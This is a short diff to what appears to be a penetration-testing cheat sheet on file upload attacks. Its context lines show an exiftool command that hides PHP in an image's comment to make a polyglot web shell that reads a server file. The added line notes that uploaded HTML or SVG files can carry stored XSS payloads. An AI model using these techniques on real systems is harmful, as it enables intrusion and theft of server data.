@@ -21,3 +21,4 @@ Polyglot web shell upload :
       Exiftool 
       exiftool -Comment="<?php echo 'START ' . file_get_contents('/file') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
 
+If you can upload HTML files or SVG images, you can potentially use <script> tags to create stored XSS payloads.
